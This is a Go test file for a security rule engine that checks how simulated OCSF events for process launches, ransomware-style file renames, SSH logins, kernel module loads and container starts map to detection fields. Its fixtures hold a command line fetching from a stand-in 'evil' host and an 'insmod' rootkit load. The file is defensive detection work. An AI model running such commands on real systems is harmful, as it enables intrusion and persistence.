package ruleeval

import (
	"testing"
	"time"

	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

func TestCategoryToClassCoversPhase1(t *testing.T) {
	cases := map[ruleast.Category]ocsf.ClassID{
		ruleast.CategoryProcessCreation:    ocsf.ClassProcessActivity,
		ruleast.CategoryFileEvent:          ocsf.ClassFileSystemActivity,
		ruleast.CategoryNetworkConnection:  ocsf.ClassNetworkActivity,
		ruleast.CategoryAuthentication:     ocsf.ClassAuthentication,
		ruleast.CategoryDriverLoad:         ocsf.ClassKernelActivity,
		ruleast.CategoryContainerLifecycle: ocsf.ClassContainerLifecycle,
	}
	for cat, want := range cases {
		got, ok := CategoryToClass(cat)
		if !ok || got != want {
			t.Errorf("CategoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
		}
	}
}

func TestEnvLookupOnProcessActivity(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.ProcessActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-1"},
		ClassUID:   ocsf.ClassProcessActivity,
		ClassName:  ocsf.ClassProcessActivity.String(),
		ActivityID: ocsf.ProcessActivityLaunch,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Process: ocsf.Process{
			PID:     1234,
			Name:    "sh",
			Cmdline: "sh -c curl http://evil/x",
			File:    &ocsf.File{Path: "/bin/sh"},
			User:    &ocsf.User{Name: "root", UID: "0"},
		},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryProcessCreation))
	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 {
			t.Errorf("Lookup(%q) miss, want hit", field)
		}
	}
	if _, ok := env.Lookup("NotAField"); ok {
		t.Errorf("Lookup of unknown field should miss")
	}
}

func TestEnvLookupRenameDestinationOnFileEvent(t *testing.T) {
	ts := time.Now().UnixMilli()
	ev := &ocsf.FileSystemActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-r"},
		ClassUID:   ocsf.ClassFileSystemActivity,
		ClassName:  ocsf.ClassFileSystemActivity.String(),
		ActivityID: ocsf.FileActivityRename,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Actor:      ocsf.Actor{Process: ocsf.Process{PID: 4321, Name: "encryptor"}},
		File:       ocsf.File{Path: "/home/alice/report.docx", Name: "report.docx"},
		RenameTo:   &ocsf.File{Path: "/home/alice/report.docx.locked", Name: "report.docx.locked"},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryFileEvent))

	// Actor PID is the kill target for ransomware response — must resolve.
	if v, ok := env.Lookup("ProcessId"); !ok || len(v) == 0 || v[0] != "4321" {
		t.Errorf("ProcessId = %v (ok=%v), want the actor PID", v, ok)
	}

	// The source path remains on TargetFilename; the .locked suffix is
	// only reachable through RenameTo / NewFilename.
	if v, ok := env.Lookup("TargetFilename"); !ok || len(v) == 0 || v[0] != "/home/alice/report.docx" {
		t.Errorf("TargetFilename = %v (ok=%v), want the source path", v, ok)
	}
	for _, field := range []string{"RenameTo", "NewFilename"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 || v[0] != "/home/alice/report.docx.locked" {
			t.Errorf("Lookup(%q) = %v (ok=%v), want the rename destination", field, v, ok)
		}
	}

	// A non-rename event carries no RenameTo, so the field must miss.
	noRename := &ocsf.FileSystemActivity{
		ClassUID:   ocsf.ClassFileSystemActivity,
		ActivityID: ocsf.FileActivityCreate,
		File:       ocsf.File{Path: "/tmp/x", Name: "x"},
	}
	if _, ok := EnvFor(noRename, AccessorFor(ruleast.CategoryFileEvent)).Lookup("RenameTo"); ok {
		t.Errorf("RenameTo on a non-rename event should miss")
	}
}

func authFixture() *ocsf.Authentication {
	return &ocsf.Authentication{
		Metadata:     ocsf.Metadata{EventCode: "auth_attempt"},
		ClassUID:     ocsf.ClassAuthentication,
		ActivityID:   ocsf.AuthActivityLogon,
		Time:         1,
		User:         ocsf.User{Name: "alice"},
		Status:       "Failure",
		StatusID:     2,
		StatusCode:   "7",
		StatusDetail: "PAM_AUTH_ERR",
		LogonType:    "Remote Interactive",
		Service:      &ocsf.Service{Name: "sshd"},
		SrcEndpoint:  &ocsf.NetEndpoint{IP: "203.0.113.9"},
		TTY:          "ssh",
		Actor: ocsf.Actor{
			Process: ocsf.Process{PID: 900, Name: "sshd", Cmdline: "sshd: alice [priv]", File: &ocsf.File{Path: "/usr/sbin/sshd"}},
			User:    ocsf.User{Name: "root"},
		},
	}
}

// TestEnvLookupOnAuthentication pins the asymmetry that matters for auth
// rules: `User` is the account being authenticated, the actor daemon's
// user is `SubjectUserName`, and the PAM result is reachable three ways.
func TestEnvLookupOnAuthentication(t *testing.T) {
	env := EnvFor(authFixture(), AccessorFor(ruleast.CategoryAuthentication))
	want := map[string]string{
		"User":            "alice",
		"TargetUserName":  "alice",
		"SubjectUserName": "root",
		"Service":         "sshd",
		"EventCode":       "auth_attempt",
		"Status":          "Failure",
		"StatusCode":      "7",
		"StatusDetail":    "PAM_AUTH_ERR",
		"SourceIp":        "203.0.113.9",
		"RemoteHost":      "203.0.113.9",
		"LogonType":       "Remote Interactive",
		"Tty":             "ssh",
		"Image":           "/usr/sbin/sshd",
		"CommandLine":     "sshd: alice [priv]",
		"ProcessId":       "900",
	}
	for field, w := range want {
		got, ok := env.Lookup(field)
		if !ok || len(got) != 1 || got[0] != w {
			t.Errorf("Lookup(%q) = %v, %v; want [%q]", field, got, ok, w)
		}
	}
	if _, ok := env.Lookup("SourceHostname"); ok {
		t.Error("SourceHostname must be absent when rhost was an IP")
	}
}

func TestEnvLookupAuthRemoteHostFallsBackToHostname(t *testing.T) {
	ev := authFixture()
	ev.SrcEndpoint = &ocsf.NetEndpoint{Hostname: "bastion"}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryAuthentication))
	if got, ok := env.Lookup("RemoteHost"); !ok || got[0] != "bastion" {
		t.Errorf("RemoteHost = %v, %v", got, ok)
	}
	if _, ok := env.Lookup("SourceIp"); ok {
		t.Error("SourceIp must be absent when rhost was a name")
	}
	ev.SrcEndpoint = nil
	env = EnvFor(ev, AccessorFor(ruleast.CategoryAuthentication))
	if _, ok := env.Lookup("RemoteHost"); ok {
		t.Error("RemoteHost must be absent for a local client")
	}
}

func TestEnvLookupOnKernelActivity(t *testing.T) {
	ev := &ocsf.KernelActivity{
		Metadata:   ocsf.Metadata{EventCode: "module_load"},
		ClassUID:   ocsf.ClassKernelActivity,
		ActivityID: ocsf.KernelActivityCreate,
		Time:       1,
		Kernel: ocsf.KernelObject{
			Name: "rk", Type: "Module", SystemCall: "init_module",
			Taints: []string{"out_of_tree", "unsigned_module"},
		},
		Status: "Success", StatusID: 1,
		Actor: ocsf.Actor{
			Process: ocsf.Process{PID: 500, Cmdline: "insmod /tmp/rk.ko", File: &ocsf.File{Path: "/usr/sbin/insmod"}},
			User:    ocsf.User{Name: "root"},
		},
	}
	env := EnvFor(ev, AccessorFor(ruleast.CategoryDriverLoad))
	want := map[string]string{
		"ImageLoaded": "rk", "Module": "rk", "Type": "Module",
		"EventCode": "module_load", "SystemCall": "init_module", "Status": "Success",
		"Image": "/usr/sbin/insmod", "CommandLine": "insmod /tmp/rk.ko", "User": "root", "ProcessId": "500",
	}
	for field, w := range want {
		got, ok := env.Lookup(field)
		if !ok || len(got) != 1 || got[0] != w {
			t.Errorf("Lookup(%q) = %v, %v; want [%q]", field, got, ok, w)
		}
	}
	if got, ok := env.Lookup("Taints"); !ok || len(got) != 2 || got[1] != "unsigned_module" {
		t.Errorf("Taints = %v, %v", got, ok)
	}
	ev.Kernel.Path = "/usr/lib/libssl.so.3"
	if got, _ := EnvFor(ev, AccessorFor(ruleast.CategoryDriverLoad)).Lookup("ImageLoaded"); got[0] != "/usr/lib/libssl.so.3" {
		t.Errorf("ImageLoaded should prefer the path: %v", got)
	}
}

func TestEnvLookupContainerIdAcrossClasses(t *testing.T) {
	const cid = "21473fb59dd89a9b9cff0ad8a1ceb82168feb3fc0ea41055565c26bd634bb4bd"
	proc := &ocsf.ProcessActivity{Process: ocsf.Process{PID: 1, ContainerID: cid}}
	if got, ok := EnvFor(proc, AccessorFor(ruleast.CategoryProcessCreation)).Lookup("ContainerId"); !ok || got[0] != cid {
		t.Errorf("process_creation ContainerId = %v, %v", got, ok)
	}
	host := &ocsf.ProcessActivity{Process: ocsf.Process{PID: 1}}
	if _, ok := EnvFor(host, AccessorFor(ruleast.CategoryProcessCreation)).Lookup("ContainerId"); ok {
		t.Error("host process must have no ContainerId (so |exists works)")
	}
	file := &ocsf.FileSystemActivity{Actor: ocsf.Actor{Process: ocsf.Process{ContainerID: cid}}}
	if got, ok := EnvFor(file, AccessorFor(ruleast.CategoryFileEvent)).Lookup("ContainerId"); !ok || got[0] != cid {
		t.Errorf("file_event ContainerId = %v, %v", got, ok)
	}
	net := &ocsf.NetworkActivity{Actor: ocsf.Actor{Process: ocsf.Process{ContainerID: cid}}}
	if got, ok := EnvFor(net, AccessorFor(ruleast.CategoryNetworkConnection)).Lookup("ContainerId"); !ok || got[0] != cid {
		t.Errorf("network_connection ContainerId = %v, %v", got, ok)
	}

	lc := &ocsf.ContainerLifecycle{
		Metadata:   ocsf.Metadata{EventCode: "container_start"},
		ClassUID:   ocsf.ClassContainerLifecycle,
		ActivityID: ocsf.ContainerActivityStart,
		Time:       1,
		Container:  ocsf.Container{UID: cid, Runtime: "docker", CgroupPath: "/system.slice/docker-" + cid + ".scope"},
		Actor:      ocsf.Actor{Process: ocsf.Process{PID: 301, File: &ocsf.File{Path: "/bin/sh"}}, User: ocsf.User{Name: "root"}},
	}
	env := EnvFor(lc, AccessorFor(ruleast.CategoryContainerLifecycle))
	for field, w := range map[string]string{
		"ContainerId": cid, "Runtime": "docker", "EventCode": "container_start",
		"CgroupPath": "/system.slice/docker-" + cid + ".scope", "Image": "/bin/sh", "User": "root", "ProcessId": "301",
	} {
		if got, ok := env.Lookup(field); !ok || got[0] != w {
			t.Errorf("container_lifecycle %s = %v, %v; want %q", field, got, ok, w)
		}
	}
}
